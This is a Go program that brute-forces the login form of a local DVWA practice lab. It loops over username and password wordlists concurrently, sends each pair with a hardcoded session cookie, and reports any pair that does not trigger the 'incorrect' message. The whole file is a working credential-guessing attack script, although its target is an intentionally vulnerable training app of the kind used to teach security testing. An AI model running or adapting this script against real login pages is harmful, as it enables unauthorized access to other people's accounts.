package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {
	url := "http://localhost/dvwa/vulnerabilities/brute/?username=%v&password=%v&Login=Login#"
	client := new(http.Client)

	var okLogin, okPass string
	loginFile, err := os.Open("login_list.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer loginFile.Close()

	loginScanner := bufio.NewScanner(loginFile)
	wg := new(sync.WaitGroup)
	for loginScanner.Scan() {
		login := loginScanner.Text()
		login = strings.Replace(login, " ", "+", -1)
		wg.Add(1)
		go func() {
			passFile, err := os.Open("password_list.txt")
			if err != nil {
				fmt.Println(err)
				return
			}

			passScanner := bufio.NewScanner(passFile)

			for passScanner.Scan() {
				pass := passScanner.Text()
				pass = strings.Replace(pass, " ", "+", -1)
				req, err := http.NewRequest(http.MethodGet, fmt.Sprintf(url, login, pass), nil)
				req.Header.Add("Cookie", "PHPSESSID=9jkge3ibsrqj8atog5bnt1ta63; security=low")
				if err != nil {
					fmt.Println(err)
					return
				}
				resp, err := client.Do(req)
				if err != nil {
					fmt.Println(err)
					return
				}
				if resp.StatusCode != 200 {
					fmt.Printf("status code = %v\n", resp.StatusCode)
					continue
				}
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(err)
					return
				}
				bodyStr := string(body)
				if !strings.Contains(bodyStr, "Username and/or password incorrect") {
					fmt.Printf("SUCCESS!\nlogin: %v\npass: %v\n", login, pass)
					okLogin = login
					okPass = pass
				}
			}
			passFile.Close()
			wg.Done()
		}()
	}
	wg.Wait()

	if err := loginScanner.Err(); err != nil {
		fmt.Println(err)
	}

	if okPass == "" && okLogin == "" {
		fmt.Printf("Пароль не найден!\n")
	}
}
